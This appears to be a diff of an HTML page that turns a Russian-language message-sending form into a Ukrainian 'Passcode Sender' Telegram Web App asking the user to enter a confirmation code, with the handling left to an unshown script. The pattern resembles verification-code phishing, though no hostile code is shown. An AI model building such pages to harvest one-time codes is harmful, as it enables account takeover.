@@ -1,56 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="uk">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="loginScreenScripts.css">
-    <link rel="stylesheet" href="squares.css">
-    <link rel="stylesheet" href="popup.css">
-    <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Passcode Sender</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-
 <body>
-    <div class="area">
-        <div class="container">
-            <!-- Existing content -->
+  <div class="box">
+    <h2>Введіть код підтвердження</h2>
+    <input type="text" id="passcode" placeholder="123456">
+    <button id="confirm-btn">Підтвердити</button>
+  </div>
 
-            <!-- New section for sending message -->
-            <div id="message-section">
-                <h1>Введите сообщение</h1>
-                <textarea id="message-input" placeholder="Ваше сообщение"></textarea>
-                <button class="btn" id="send-btn">Отправить в Telegram</button>
-            </div>
-        </div>
-
-        <!-- Existing content -->
-
-    </div>
-
-    <script src="loginScreenScripts.js"></script>
-    <script>
-        // Отправляем сообщение в Telegram через сервер
-        document.getElementById('send-btn').addEventListener('click', function () {
-            const message = document.getElementById('message-input').value;
-
-            // Отправка запроса на сервер
-            fetch('/send-message', {  
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ message: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Сообщение отправлено в Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Ошибка отправки сообщения:', error);
-            });
-        });
-    </script>
+  <script src="script.js"></script>
 </body>
-
 </html>
